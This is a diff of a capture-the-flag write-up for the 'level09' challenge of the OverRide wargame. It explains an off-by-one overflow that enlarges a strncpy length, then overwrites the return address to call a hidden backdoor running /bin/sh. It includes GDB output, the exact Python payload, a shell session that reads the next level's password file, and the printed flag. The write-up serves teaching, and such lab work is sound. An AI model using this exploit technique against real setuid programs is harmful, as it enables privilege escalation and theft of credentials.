@@ -10,36 +10,48 @@ level09@OverRide:~$ ls -la level09
 -rwsr-s---+ 1 end users 12959 Oct  2  2016 level09
 ```
 
-handle_msg:
-    - buffer[140]
+Decompiling with Hex-Rays on https://dogbolt.org/ show us that:
+- an unused `secret_backdoor` function is present which take a n input string and use it to execute a call to `system()`. Passing `/bin/sh` should open a shell.
+- the program use the buffer address to store a message (string), the buffer address + 140 to store a username (string) and the buffer address + 180 as a size (int). So we can deduce that this is probably a structure:
+```
+    char    message[140];
+    char    name[40];
+    int     size;
+```
+- the size is used by strncpy to copy the user input  into message
+- the set_username function copy 41 bytes in the string name which is 40 bytes. it is followed by size, so overflowing username allow us to modify the size.
+So overflowing a first time to modify the size of the copy allow us to overflow a second time to modify `EIP` with the address of `secret_backdoor` to whom we will pass `/bin/sh` to be executed by `system()`.
 
-set_username:
-    - copy 40 bytes in buffer + 140.
-
-set_msg:
-    - use buffer + 180 as a size.
-    - to copy as much bytes in buffer
-
-Buffer seem to be a structure composed of two string and an integer. one string used in set_username (buffer + 140), the other in set_msg (buffer + 0). (buffer + 180) is used as an integer for the strncpy length.
-
+Using a buffer overflow pattern, we search for the offset between the beginning of message variable and `EIP`.
+We will use 40 bytes of padding and set the following bytes to `0xff`, the highest possible value for a byte, hoping it will be enough to overwrite `EIP`.
 ```Shell
-(gdb) disas handle_msg
-Dump of assembler code for function handle_msg:
-   0x00000000000008c4 <+4>:     sub    $0xc0,%rsp
+Program received signal SIGSEGV, Segmentation fault.
+0x0000555555554931 in handle_msg ()
+(gdb) p $rbp
+$1 = (void *) 0x6741356741346741
+```
+We get a segmentation fault, but we can’t use its address with our tool, so we will use the address of `EBP` instead. We get an offset of 192; adding 8 bytes (the size of an address in 64-bit) gives us the offset to reach `EIP`, which is 200.
+
+Using GDB we get the address of `secret_backdoor()` which is `0x55555555488c`:
+```Shell
+(gdb) p secret_backdoor
+$4 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
 ```
 
-192 bytes allocated:
-    140:    string one
-    40:     string two
-    4 or 8: integer
-
-possible struct:
-    char*   msg[140];
-    char*   username[40];
-    int     size;
-
-Vulnerability is in set_username, where 41 character in 40 character string username, overflowing in number, allowing us to determine the size of the strncpy in set_msg.
+So our payload will be:
+- 40 bytes of padding follow by `0xff`.
+- 200 bytes of padding followed by the address of `secret_backdoor`.
+- the input for `secret_backdoor()`: `/bin/sh`.
 
 ```Shell
-python -c 'print("A" * 40 + "\xff" + "\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9")' > /tmp/payload9
+level09@OverRide:~$ python -c 'print("A" * 40 + "\xff" + "\n" + "B" * 200 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1] + "\n" + "/bin/sh" + "\n")' > /tmp/payload9
+level09@OverRide:~$ cat /tmp/payload9 - | ./level09 
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+cat /home/users/end/.pass
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
 ```
